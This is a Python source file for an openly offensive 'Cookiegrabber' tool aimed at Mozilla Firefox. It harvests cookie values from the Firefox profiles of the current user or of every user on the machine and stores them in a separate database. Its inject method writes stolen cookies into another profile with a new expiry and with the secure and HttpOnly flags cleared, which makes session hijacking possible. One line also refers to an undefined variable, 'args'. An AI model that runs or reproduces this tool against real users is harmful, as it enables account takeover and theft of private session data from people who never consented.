#!/usr/bin/env python3.3
# -*- coding: utf8 -*-
#
# Cookiegrabber for Mozilla
#   Grabs the cookies from Mozilla Firefox 
#
# Copyright (c) 2015    NorthernSec
# Copyright (c) 2015    Pieter-Jan Moreels

# Imports
import getpass
import os
import platform
import sqlite3
import sys
import time
from Cookie import Cookie
from DatabaseConnection import selectAllFrom, grabJar, addToJar
from Toolkit import getUsers, subdirsOf

class MozillaGrabber():
  def __init__(self, args):
    self.args=args
    if platform.system() == "Linux":
      self.cookieTrail='/home/%s/.mozilla/firefox/%s/cookies.sqlite'
      self.profiles='/home/%s/.mozilla/firefox'
    elif platform.system() == "Windows":
      self.cookieTrail='C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\%s\\cookies.sqlite'
      self.profiles='C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'
    else:
      sys.exit("Unsupported platform")

  def grabAndStore(self, database=None, allUsers=False):
    path = database if database else "../CookieJar.sqlite"
    users=getUsers() if allUsers else [getpass.getuser()]
    grabJar(path)
    cookies=selectAllFrom(path, "CookieJar")
    cs=[]
    if self.args.v: print("Starting with Mozilla Cookies")
    for u in users:
      if self.args.v: print(" |- Grabbing cookies of %s"%u)
      for p in self.getProfiles(u):
        if not os.path.isfile(self.cookieTrail%(u,p)):
          if args.v: print(" |   | -> Profile %s does not have cookies"%p)
          continue
        if self.args.v: print(" |   |- Grabbing cookies of profile %s"%p)
        for c in selectAllFrom(self.cookieTrail%(u,p), "moz_cookies"):
          if not any(d['domain']==c['basedomain'] and d['name']==c['name'] and d['value']==c['value'] and d['browser']=='firefox'
                     and d['user']=='%s:%s'%(u,p) for d in cookies):
            cs.append(Cookie(c['basedomain'], c['host'], c['name'], c['value'], 'firefox', '%s:%s'%(u,p), c['lastaccessed'], c['creationtime']))
        if self.args.v: print(" |   | -> Stored %s new cookies"%len(cs))
    addToJar(path, cs)

  def getProfiles(self, user):
    p=subdirsOf(self.profiles%user)
    if "Crash Reports" in p: p.remove("Crash Reports")
    return p

  def getBrowserName(self):
    return "Mozilla Firefox"

  def inject(self, cookies, user, profile):
    path=self.cookieTrail%(user,profile)
    if type(cookies)!=list:
      cookies=[cookies]
    moz=sqlite3.connect(path)

    for c in cookies:
      moz.execute('''INSERT OR REPLACE INTO moz_cookies
                    (baseDomain, host,  name, value, path, expiry,lastAccessed,creationTime,isSecure, isHTTPOnly)
                     VALUES(:dom,:host,:name,:val,:path,:exp,:la,:ct,:is,:http)''',
                     {'dom':c.domain,    'host':c.host,       'name': c.name,  'val':c.value,   'path':'/', 'exp':int(time.time()*1000000)+2592000,
                      'la':  c.lastUsed, 'ct':c.creationTime, 'is':0,          'http':0})
    moz.commit()
    moz.close()



